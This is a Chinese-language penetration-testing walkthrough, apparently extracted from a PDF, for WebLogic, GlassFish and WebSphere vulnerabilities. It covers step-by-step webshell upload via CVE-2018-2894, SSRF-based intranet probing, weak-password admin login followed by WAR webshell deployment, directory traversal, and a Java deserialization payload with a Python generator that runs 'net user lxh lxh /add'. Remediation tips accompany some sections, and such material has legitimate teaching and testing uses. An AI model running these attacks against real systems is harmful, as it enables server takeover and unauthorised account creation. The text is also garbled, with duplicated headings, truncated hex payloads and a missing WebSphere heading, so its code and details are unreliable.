任意文件上传漏洞（CVE-2018-2894）
）
Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在"生产模式"下默认不开启，所以该漏洞有一定限制。
影响版本：12.1.3.0, 12.2.1.2, 12.2.1.3
下载Weblogic 12.1.3.0
安装的时候将Weblogic放在Java JDK的bin目录下，防止出现因环境变量带空格导致的错误，安装过程一直点击下一步即可。
以下复现是在Weblogic开发模式下进行的，若需在生产模式下进行复现，则需要 登录后台页面，点击base_domain的配置，在"高级"设置中 开启 "启用 Web
服务测试页" 选项，经过我的验证发现开启之后，不仅需要账号密码登陆，即使登陆了也没有这两处上传点。
访问 ws_utc/config.do，设置Work Home Dir为ws_utc应用的静态文件css目
录C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3\cmprq0\war\css，
因为访问这个目录是无需权限的，提交后，点击左侧 安全-> 添加，然后上传Webshell。
点击提交并抓包，获取响应数据包中的时间戳。
然后访问 http://127.0.0.1:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，即可执行webshell：
访问 ws_utc/begin.do，点击右上角的文件夹，上传Webshell，点击提交，并抓包。
在返回数据包中得到Webshell路径。
然后访问http://127.0.0.1:7001/ws_utc/css/upload/RS_Upload_2019-06-07_17-12-18_558/import_file_name_lxhspy.jsp
Note:
1）ws_utc/begin.do 使用的工作目录是在
使用的工作目录是在ws_utc/config.do中设置的
中设置的Work Home Dir。
。
2）利用需要知道部署应用的web目录。
3）在生产模式下默认不开启，在后台开启之后，需要认证
修复建议
修复建议
启动生产模式，
编辑domain路径下的setDomainEnv.cmd文件，将set PRODUCTION_MODE= 更改为 set PRODUCTION_MODE=true
C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\bin\setDomainEnv.cmd
目前(2019/06/07) 生产模式下 已取消这两处上传文件的地方。
Weblogic SSRF漏洞
漏洞 （
（CVE-2014-4210）
）
影响版本：10.0.2.0, 10.3.6.0
访问 /uddiexplorer/SearchPublicRegistries.jsp，若能正常访问，则可能存在此漏洞，填写任意信息，如下
点击Search，并抓包，抓包之后在Burp中右键，选择Change request method, 将POST请求改变成GET。
参数operator为SSRF的可控参数，将其更改为开放的端口，如http://127.0.0.1:7001/，将返回error code
若开放端口为HTTP协议，则会返回did not have a valid SOAP content-type。
访问不存在的端口，将返回could not connect over HTTP to server
通过 返回数据包 中的错误信息，即可探测内网状态。
修复建议
修复建议
删除SearchPublicRegistries.jsp文件或修改SearchPublicRegistries.jsp文件后缀为不解析后缀，如SearchPublicRegistries.jspxxx，后重启Weblogic，再次访
问，如下：
SearchPublicRegistries.jsp路径为：
C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war
Weblogic 弱口令
弱口令 && 后台
后台getshell
弱口令参考：https://cirt.net/passwords?criteria=WebLogic
访问http://127.0.0.1:7001/console
自动重定向到http://127.0.0.1:7001/console/login/LoginForm.jsp，使用弱口令登陆后台。
点击部署，进一步点击右边的安装。
点击上载文件，
选择war包，点击下一步
上传完成以后选中你上传的文件,点击下一步
选中作为应用程序安装，点击下一步
然后直接点击完成即可
选用我们安装的应用，点击启动即可。
访问：http://ip:port/[war包名]/[包名内文件名]
修复建议
修复建议
避免后台弱口令。
GlassFish
GlassFish 是用于构建 Java EE 5应用服务器的开源开发项目的名称。它基于 Sun Microsystems 提供的 Sun Java System Application Server PE 9 的源代码
以及 Oracle 贡献的 TopLink 持久性代码。该项目提供了开发高质量应用服务器的结构化过程，以前所未有的速度提供新的功能。
默认端口：8080（Web应用端口，即网站内容），4848（GlassFish管理中心）
默认返回的指纹信息:
Server: GlassFish Server Open Source Edition  4.1.2
X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  4.1.2  Java/Oracle Corporation/1.8)
下载4.1.2版本
解压后，进入glassfish/bin目录下打开CMD窗口输入asadmin start-domain启动glassfish
asadmin stop-domain 停止glassfish
GlassFish Directory Traversal（
（CVE-2017-1000028）
）
java语言中会把%c0%af解析为\uC0AF，最后转义为ASCCII字符的/（斜杠）。利用..%c0%af..%c0%af来向上跳转，达到目录穿越、任意文件读取的效果。
计算机指定了UTF8编码接收二进制并进行转义，当发现字节以0开头，表示这是一个标准ASCII字符，直接转义，当发现110开头，则取2个字节 去掉110模
板后转义。
UTF8编码模板如下
字节数
字节数
大小范围（十进制）
大小范围（十进制）
字节
字节1
字节
字节2
字节
字节3
字节
字节4
1
U + 0000~ U + 007F（0~127）
0xxxxxxx
None
None
None
2
U + 0080~ U + 07FF（128~2047）
110xxxxx
10xxxxxx
None
None
3
U + 0800~ U + 0FFF（2048~65535）
1110xxxx
10xxxxxx
10xxxxxx
None
4
U + 10000 ~ U + 10FFFF(65536~1114111)
11110xxx
10xxxxxx
10xxxxxx
10xxxxxx
C0AF 转换位二进制为 110 00000 10 101111 ，110开头去掉摸板后为00000 101111 转换为10进制为47，ASSCI为/.
受影响版本：
rO0ABXNyABtqYXZheC5tYW5hZ2VtZW50Lk9iamVjdE5hbWUPA6cb620VzwMAAHhwdACxV2ViU3BoZXJlOm5hbWU9Q29uZmlnU2VydmljZSxwcm9jZXNzPXNlcnZlcjEscGxh
getUnsavedChanges
rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlw
rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ACRjb20uaWJtLndlYnNwaGVyZS5tYW5hZ2VtZW50LlNlc3Npb24=
Payload执行的命令是 net user lxh lxh /add,效果如下：
如果想要更改执行的命令，可通过如下代码，代码在python3下执行。
import base64
from binascii import unhexlify
command = "net user lxh lxh /add"
serObj = unhexlify("ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657
serObj += (chr(len(command)) + command).encode('ascii')
serObj += unhexlify("740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E
serObjB64 = base64.b64encode(serObj).decode()
print(serObjB64)
将输出的serObjB64，替换到上面Payload中的params节点，其余无需改变。
{serObjB64}
回显参考DeserializeExploit.jar(laster)
修复建议
修复建议
7.x版本已不提供支持，因此选择升级版本。
若版本还在IBM支持范围，可选择打补丁。
弱口令
弱口令 && 后台
后台Getshell
1. 在6.x至7.0版本，后台登陆只需要输入 admin作为用户标识，无需密码，即可登陆后台。
2. websphere/ websphere
3. system/ manager
1.点击WebSphere 企业应用程序，点击安装。
2.上传war包，点击下一步。
3.一直点击下一步，直到下图，填写上下文根，关系到你访问的URL，接着一直点下一步直到安装完成。
4.安装完成之后，点击保存主配置，然后回到WebSphere 企业应用程序，选中war包启动，访问shell。
修复建议
修复建议
设置密码。
参考资料
参考资料
https://www.google.com.hk
https://www.baidu.com
http://www.wooyun.org
https://github.com/vulhub 漏洞列表
http://cve.mitre.org 漏洞列表